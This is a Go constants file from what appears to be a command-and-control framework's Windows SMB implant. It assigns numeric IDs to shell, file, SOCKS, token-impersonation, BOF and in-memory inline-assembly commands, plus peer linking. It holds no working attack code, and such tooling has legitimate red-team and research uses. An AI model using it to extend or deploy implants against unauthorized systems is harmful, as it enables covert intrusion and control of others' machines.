// server/docker/payloads/SMB_Windows/cmd_ids.go

//go:build windows
// +build windows

package main

// Command IDs - must match server/internal/common/commands/registry.go
// These numeric IDs are used for command dispatch without string matching.

// Cross-platform commands (1-99)
const (
	CmdCd       = 1
	CmdLs       = 2
	CmdPwd      = 3
	CmdDownload = 4
	CmdUpload   = 5
	CmdShell    = 6
	CmdSocks    = 7
	CmdJobkill  = 8
	CmdExit     = 9
	CmdSleep    = 10
	CmdRekey    = 11
	CmdEnv      = 12
	CmdCat      = 13
	CmdHash     = 14
	CmdHashDir  = 15
	CmdPs       = 16
	CmdRm       = 17
	CmdWhoami   = 18
)

// Windows specific commands (200-299)
const (
	CmdToken                   = 200
	CmdRev2self                = 201
	CmdBof                     = 210
	CmdBofAsync                = 211
	CmdBofJobs                 = 212
	CmdBofOutput               = 213
	CmdBofKill                 = 214
	CmdInlineAssembly          = 220
	CmdInlineAssemblyAsync     = 221
	CmdInlineAssemblyJobs      = 222
	CmdInlineAssemblyOutput    = 223
	CmdInlineAssemblyKill      = 224
	CmdInlineAssemblyJobsClean = 225
	CmdInlineAssemblyJobsStats = 226
	CmdLink                    = 230
	CmdUnlink                  = 231
	CmdLinks                   = 232
)

// CmdUnknown indicates an unrecognized command (treat as shell)
const CmdUnknown = -1
